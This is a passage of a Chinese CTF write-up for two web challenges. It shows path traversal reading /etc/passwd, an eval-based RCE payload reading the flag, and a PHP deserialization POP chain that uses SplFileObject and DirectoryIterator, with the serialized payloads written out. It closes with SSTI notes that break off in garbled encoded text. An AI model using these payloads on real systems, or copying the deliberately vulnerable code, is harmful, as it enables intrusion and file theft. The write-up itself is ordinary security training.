data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>重新回到主页，看到那个东西下载有点像任意文件下载</p><p>我们下一个..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd试试</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled9.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>成功下载，我们下载自身：<code>app.py</code></p><p>成功下载</p><ul><li><p>app.py源码：</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>我们注意到一段（比较狗血的就是我之前在登录界面徘徊那段时间，用目录扫描扫出了这个玩意）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def hello_world():</span><br><span class="line">    try:</span><br><span class="line">        s = request.args.get(&#x27;eval&#x27;)</span><br><span class="line">        return f&quot;hello,&#123;eval(s)&#125;&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    return &quot;hello&quot;</span><br></pre></td></tr></table></figure><p>这里我们直接可以rce了</p><p>payload：</p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;ls&#39;).read()</code></p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;ls /&#39;).read()</code></p><p><code>/hello/?eval=**import**(&#39;os&#39;).popen(&#39;cat /flag_is_h3re&#39;).read()</code></p><p>得到flag</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled10.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="被遗忘的反序列化（估计是非预期解）"><a href="#被遗忘的反序列化（估计是非预期解）" class="headerlink" title="被遗忘的反序列化（估计是非预期解）"></a><strong>被遗忘的反序列化</strong>（估计是非预期解）</h1><ul><li><p>题目：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 当前目录中有一个txt文件哦</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;check.php&quot;);</span><br><span class="line"></span><br><span class="line">class EeE&#123;</span><br><span class="line">    public $text;</span><br><span class="line">    public $eeee;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if ($this-&gt;text == &quot;aaaa&quot;)&#123;</span><br><span class="line">            echo lcfirst($this-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($kk)&#123;</span><br><span class="line">        echo &quot;$kk,eeeeeeeeeeeee&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cycycycy&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    private $b;</span><br><span class="line"></span><br><span class="line">    public function aaa()&#123;</span><br><span class="line">        $get = $_GET[&#x27;get&#x27;];</span><br><span class="line">        $get = cipher($get);</span><br><span class="line">        if($get === &quot;p8vfuv8g8v8py&quot;)&#123;</span><br><span class="line">            eval($_POST[&quot;eval&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $a_a = $this -&gt; a;</span><br><span class="line">        echo &quot;\$a_a\$&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class gBoBg&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $file;</span><br><span class="line">    public $coos;</span><br><span class="line">    private $eeee=&quot;-_-&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;name))&#123;</span><br><span class="line">            $a = new $this-&gt;coos($this-&gt;file);</span><br><span class="line">            echo $a;</span><br><span class="line">        &#125;else if(!isset($this -&gt; file))&#123;</span><br><span class="line">            return $this-&gt;coos-&gt;name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $aa = $this-&gt;coos;</span><br><span class="line">            $bb = $this-&gt;file;</span><br><span class="line">            return $aa();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w_wuw_w&#123;</span><br><span class="line">    public $aaa;</span><br><span class="line">    public $key;</span><br><span class="line">    public $file;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$this -&gt; key))&#123;</span><br><span class="line">            $this-&gt;key = file_get_contents($this -&gt; file);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;不行哦&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</span><br><span class="line"></span><br><span class="line">unserialize($_ip);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>把代码拉到vscode比较容易看一些</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled11.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled11.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>先看一下题目的代码，反序列化的注入点在<code>$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</code></p><p>所以我们需要在http请求头注入一个参数：AAAAAA:xxx（xxx为反序列化的内容）</p><p>这里直接挑重点看了（毕竟只用到2个类）（此处省略了其他没用到的东西，方便理解）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">#__toString魔术函数，但一个对象被当作字符串使用时被调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;  <span class="comment">#name有定义，但定义什么没有关系，因为后面没用到</span></span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file); <span class="comment">#coos作为函数的名，file作函数的参数</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># 输出</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道在php中支持使用<code>$a($b)</code>这样动态的形式调用函数&#x2F;实例化，</p><p>可以看到我们这一行就是这样的形式：<code>$a = new $this-&gt;coos($this-&gt;file);</code></p><p>所以我们的思路是通过给coos和file赋值，实现rce或者文件操作</p><ul><li>有人就问了：coos我用了<code>file_get_contents，</code>file我传入了地址，为什么读取不到文件。</li></ul><p>答：因为这行代码是对象实例化，而<code>file_get_contents</code>是一个函数，不是一个类，所以我们这里coos要传入一个内置类了</p><p>这里我们就需要看一下有什么内置类了</p><blockquote><p>可遍历目录类有以下几个：</p></blockquote><ul><li>DirectoryIterator 类</li><li>FilesystemIterator 类</li><li>GlobIterator 类</li></ul><blockquote><p>可读取文件类有：</p></blockquote><ul><li>SplFileObject 类</li></ul><p>我们需要用内置类来遍历目录，然后读取文件</p><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="comment">// private $eeee=&quot;-_-&quot;;</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br></pre></td></tr></table></figure><p>分两步走，第一步读取文件目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///*f*&quot;</span>; <span class="comment">#使用glob协来查找匹配的文件路径模式 这里/*f*匹配了根目录下包含f的文件夹名</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br><span class="line"></span><br><span class="line">得到：O:<span class="number">7</span>:<span class="string">&quot;w_wuw_w&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;gBoBg&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;glob:///*f*&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;coos&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;DirectoryIterator&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled12.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled12.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>第二步，使用<code>SplFileObject</code>类读取文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">得到：O:<span class="number">7</span>:<span class="string">&quot;w_wuw_w&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;gBoBg&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;/f1agaaa&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;coos&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;SplFileObject&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled13.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled13.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>SSTI知识点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">**<span class="keyword">class</span>**            类的一个内置属性，表示实例对象的类。</span><br><span class="line">**base**             类型对象的直接基类</span><br><span class="line">**bases**            类型对象的全部基类，以元组形式，类型的实例通常没有属性 **basesmro**              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">**subclasses**()     返回这个类的子类集合，Each <span class="keyword">class</span> <span class="title class_">keeps</span> a <span class="built_in">list</span> of weak references to its immediate subclasses. This method returns a <span class="built_in">list</span> of <span class="built_in">all</span> those references still alive. The <span class="built_in">list</span> <span class="keyword">is</span> <span class="keyword">in</span> definition order.</span><br><span class="line">**init**             初始化类，返回的类型是function</span><br><span class="line">**<span class="built_in">globals</span>**          使用方式是 函数名.**globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">dic              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">getattribute()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：[a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。](http://a.xxx/a.xxx()%EF%BC%<span class="number">89</span>%EF%BC%8C%E9%<span class="number">83</span>%BD%E4%BC%9A%E8%<span class="number">87</span>%AA%E5%8A%A8%E5%8E%BB%E8%B0%<span class="number">83</span>%E7%<span class="number">94</span>%A8__getattribute__%E6%<span class="number">96</span>%B9%E6%B3%<span class="number">95</span>%E3%<span class="number">80</span>%<span class="number">82</span>%E5%9B%A0%E6%AD%A4%E6%<span class="number">88</span>%<span class="number">91</span>%E4%BB%AC%E5%<span class="number">90</span>%8C%E6%A0%B7%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E9%<span class="number">80</span>%9A%E8%BF%<span class="number">87</span>%E8%BF%<span class="number">99</span>%E4%B8%AA%E6%<span class="number">96</span>%B9%E6%B3%<span class="number">95</span>%E6%9D%A5%E8%8E%B7%E5%8F%<span class="number">96</span>%E5%<span class="number">88</span>%B0%E5%AE%9E%E4%BE%8B%E3%<span class="number">80</span>%<span class="number">81</span>%E7%B1%BB%E3%<span class="number">80</span>%<span 